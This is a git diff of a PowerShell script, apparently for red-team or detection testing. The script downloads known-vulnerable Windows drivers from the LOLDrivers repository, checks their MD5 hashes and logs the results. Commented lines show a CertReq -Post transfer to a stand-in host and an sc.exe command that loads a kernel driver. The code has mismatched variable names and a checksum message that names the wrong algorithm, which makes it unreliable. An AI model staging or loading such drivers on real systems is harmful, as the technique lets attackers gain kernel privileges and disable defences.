@@ -9,7 +9,7 @@ Write-Output "==================================================================
 $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
 $StoragePath = "$env:PUBLIC\Toolz";
 $LogFile = "$env:PUBLIC\exf\Vuln_Drivers_windivert.txt";
-$DownloadUrl = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/"
+$DownloadUrl = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers"
 
 $VulnDriversArray = @(
     [PSCustomObject]@{
@@ -22,46 +22,48 @@ $VulnDriversArray = @(
     }
 )
 ################ [ FUNCTIONS ] ################
-
 # Function to Download files
 function DownloadFiles {
-
-# CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext file.txt
-# sc.exe create amigendrv64.sys binPath=C:\windows\temp\amigendrv64.sys type=kernel && sc.exe start amigendrv64.sys
     param(
-#        [Parameter(Mandatory = $true)]
+        [Parameter(Mandatory = $false)]
         [string]$DownloadFrom=$DownloadUrl,
         [Parameter(Mandatory = $true)]
         [string]$DonwnloadedFileName,
         [Parameter(Mandatory = $true)]
         [string]$StorageFileName,
-        [Parameter(Mandatory = $true)]
-        [string]$StorageDirectory
+        [Parameter(Mandatory = $false)]
+        [string]$StorageDirectory=$StoragePath
         )
-
-$ArchiveFile = "PSTools.zip"
-$DestinationDirectory = "$env:PUBLIC\PSTools"
-$Full_Destination = "$env:PUBLIC\Toolz\$StorageFileName"
-
-
-$CompleteCommand = "Invoke-WebRequest -Uri " + "$DownloadFrom" + " -outfile " + "$Full_Destination";
+$WhatToDownload = $DownloadFrom+"/"+$DonwnloadedFileName+".bin"
+$Full_Destination = $StorageDirectory+"\"+$StorageFileName
+$CompleteCommand = "Invoke-WebRequest -Uri " + "$WhatToDownload" + " -outfile " + "$Full_Destination";
 try {
     
     Invoke-Expression  "$CompleteCommand";
-    Write-Output "Successfully downloaded [$ArchiveFile] to $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
-    New-Item -ItemType "directory" $DestinationDirectory -Force;
-    $psdir = Get-Item "$DestinationDirectory" -Force;
-    $psdir.attributes = "hidden";
-
+    Write-Output "Successfully Downloaded file $DownloadedFileName from $DownloadFrom" | Out-File -FilePath "$LogFile" -Encoding ascii -Append;     
     if ([System.IO.File]::Exists("$Full_Destination")) {
-        Add-Type -Assembly 'System.IO.Compression.FileSystem';
-        [System.IO.Compression.ZipFile]::ExtractToDirectory("$Full_Destination", "$DestinationDirectory");
-        Write-Output "The file [$ArchiveFile] has been extracted to  $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding ascii -Append;
-        Get-ChildItem -Path $DestinationDirectory | Out-File -FilePath $LogFile -Encoding ascii -Append
-        exit 0;
+        Write-Output "Successfully Stored file $StorageFileName in $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
+        # Check downloaded file MD5 summ
+        $Md5Check = (Get-FileHash -Path $Full_Destination -Algorithm MD5).Hash
+        # Compare CheckSumms
+            if ($Md5Check -eq $DonwnloadedFileName) {
+                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
+                Write-Output " [ MD5SUM checks OK ] Stored File name : $StorageFileName" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
+                Write-Output "                     Orignal File name : $DownloadedFileName" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
+                Write-Output "                     Computed md5 summ : $Md5Check" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
+                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
+                return                                                
+            } else {
+                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding ascii -Append                
+                Write-Output "[ ERROR ] $StorageFileName : somme SHA256 incorrecte." | Out-File -FilePath "$LogFile" -Encoding ascii -Append
+                Write-Output "             Expected summ : $DownloadedFileName" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
+                Write-Output "             Computed summ : $Md5Check" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
+                Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding ascii -Append
+                exit 3;
+            }
     } 
     else {
-        Write-Output "The file [$ArchiveFile] does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
+        Write-Output "The file $Full_Destination does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
         exit 2;
     };
 
@@ -70,8 +72,12 @@ catch {
     Write-Output "Error : $($_.Exception.Message)" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
     exit 1;   
 }
-
 }
+
+
+# CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext file.txt
+# sc.exe create amigendrv64.sys binPath=C:\windows\temp\amigendrv64.sys type=kernel && sc.exe start amigendrv64.sys
+
 
 ################ [ MAIN BODY ] ################
 Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Force
